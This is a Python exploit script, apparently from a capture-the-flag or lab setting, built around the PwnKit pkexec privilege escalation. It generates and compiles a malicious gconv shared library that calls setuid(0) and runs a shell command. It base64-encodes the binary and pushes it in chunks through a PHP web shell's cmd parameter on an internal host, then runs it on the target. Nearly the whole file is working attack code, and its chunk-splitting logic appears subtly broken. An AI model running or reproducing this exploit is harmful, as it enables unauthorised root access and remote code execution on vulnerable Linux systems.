#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Remote: ./exp.py remote ip:port -nl

import subprocess
from base64 import b64encode, b64decode
import requests

lg_inf = lambda s : print('\033[1m\033[33m[*] %s\033[0m' % (s))
lg_err = lambda s : print('\033[1m\033[31m[x] %s\033[0m' % (s))
lg_suc = lambda s : print('\033[1m\033[32m[+] %s\033[0m' % (s))
commands = []

exec_sh = "ls"

c_code = r'''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char *shell =
       "#include <stdio.h>\n"
       "#include <stdlib.h>\n"
       "#include <unistd.h>\n\n"
       "void gconv() {}\n"
       "void gconv_init() {\n"
       "       setuid(0); setgid(0);\n"
       "       seteuid(0); setegid(0);\n"
       "       system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; '''

c_code += exec_sh + r''' /tmp/1\");\n"
       "       exit(0);\n"
       "}";
       
int main(int argc, char *argv[]) {
        FILE *fp;
        system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
        system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
        fp = fopen("pwnkit/pwnkit.c", "w");
        fprintf(fp, "%s", shell);
        fclose(fp); 
        system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
         char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
        execve("/usr/bin/pkexec", (char*[]){NULL}, env);
}
'''
with open("./exp.c", "w") as fd:
    fd.write(c_code)

lg_inf("compiling exp.c")
if subprocess.run("musl-gcc -static -o exp.bin exp.c", shell=True).returncode:
    lg_err("compile error")
lg_suc("compile finished")

exp_data_list = []
SPLIT_LENGTH = 0x40
with open("./exp.bin", "rb") as f_exp:
    exp_data = b64encode( f_exp.read() ).decode()
lg_inf("Data length: " + str(len(exp_data)))
for i in range(len(exp_data) // SPLIT_LENGTH):
    exp_data_list.append( exp_data[i*SPLIT_LENGTH:(i+1)*SPLIT_LENGTH] )
if not len(exp_data)%SPLIT_LENGTH:
    exp_data_list.append( exp_data[(len(exp_data)//SPLIT_LENGTH):] )

commands.append("touch /tmp/exp.b64")
for i in exp_data_list:
    commands.append("echo -n '" + i + "'>> /tmp/exp.b64")
commands.append("base64 -d /tmp/exp.b64 > /tmp/exp; chmod +x /tmp/exp; /tmp/exp")

def upload(up_data):
    url = "http://172.31.0.134/upload/file/1.php?cmd="
    url += up_data
    r = requests.get(url)
    data = r.text.replace('{"error":"1","errorcode":"', '')
    data = data.replace(' 文件格式不允许上传。","filesize":"0"}', "")
    print(data)

for i in commands:
    upload(i)

